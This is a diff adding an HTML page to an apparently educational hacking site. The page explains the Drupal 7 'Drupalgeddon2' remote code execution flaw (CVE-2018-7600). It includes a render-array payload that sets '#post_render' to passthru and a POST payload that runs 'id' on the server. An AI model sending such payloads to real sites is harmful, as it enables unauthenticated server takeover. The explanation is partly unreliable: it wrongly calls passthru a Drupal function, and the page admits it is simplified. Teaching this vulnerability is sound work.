@@ -1,0 +1,72 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Drupal 7 + Renderable Arrays CVE-2018-7600</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/cve/cve.css' %}">
+</head>
+<body>
+    <h3>Difficulty : easy</h3>
+    <h3>From : Armageddon</h3>
+    <h1 class="title">Drupal 7 + uses “Renderable Arrays” CVE-2018-7600</h1>
+    <h2 class="subtitle">Type : RCE</h2>
+    <p class="text">Because of lack of sanitization in certain AJAX and Form API code paths, RCE can be executed.</p>
+
+    <h2 class="subtitle">Issue of Code</h2>
+    <div class="code-box">
+<pre><code>// Before patch, this check was missing in AJAX form handlers:
+foreach ($form_state['values'] as $key => $value) {
+    if ($key[0] === '#') {
+        // keys like '#post_render' were not cleaned out,
+        // so they stuck around into rendering.
+    }
+}</code></pre>
+    </div>
+    <p class="text">Before patch, this sanitization was missing in several AJAX Form API code paths, enabling attackers to inject <code>#post_render</code>, <code>#markup</code>, etc.</p>
+
+    <h2 class="subtitle">Malicious Render Chain</h2>
+    <p class="text">Drupal uses render arrays of the form:</p>
+    <div class="code-box">
+<pre><code>$render['name'] = [
+    '#type' => 'markup',
+    '#markup' => $user_input,
+    '#post_render' => ['passthru'],
+];</code></pre>
+    </div>
+
+    <p class="text"><u>#type => 'markup'</u> : It tells Drupal this is raw HTML content.</p>
+    <p class="text"><u>#markup => $user_input</u> : This is the HTML/text to render — attacker-controlled.</p>
+    <p class="text"><u>#post_render => ['passthru']</u> : This is where it gets dangerous. This field says "after rendering #markup, run this function on it".</p>
+
+    <h3>In short...</h3>
+    <p class="text">This framework contains page render query inside its get request body, so the parameter which page we want to render is controllable. <br>
+    <strong>NOTE</strong> : this explanation is simplified. Please think it is not exactly right.</p>
+    <p class="text">They're processed by Drupal's render and AJAX system. Without the sanitization, malicious input like this</p>
+    <div class="code-box">
+        <pre><code>call_user_func_array('passthru', ['user-command']);</code></pre>
+    </div>
+    <p class="text">in a POST request reaches the <code>Renderer::render()</code> and gets executed.</p>
+
+
+    <h2 class="subtitle">Key Point</h2>    
+    <div class="code-box"><pre><code>'#post_render' => ['passthru'],
+'#markup' => 'id'
+</code></pre></div>
+    <p class="text">The attacker controls which function is called and what gets passed to it, via crafted render array in request parameters.</p>
+    <p class="text"><u>passthru</u> : is a Drupal function that pass variable to shell command. In this case, we can call this function as stated above.</p>
+
+
+    <h2 class="subtitle">Flow from POST to Execution</h2>
+    <p class="text">1. POST payload</p>
+    <div class="code-box">
+<pre><code>name[#post_render][]=passthru
+name[#markup]=id
+name[#type]=markup</code></pre>
+    </div>
+    <p class="text">2. Render API builds the form without sanitizing <code>#</code> keys.</p>
+    <p class="text">3. On AJAX render or page render, <code>passthru('id')</code> gets executed.</p>
+    <p class="text">4. RCE is achieved — all this without authentication or file uploads.</p>
+</body>
+</html>
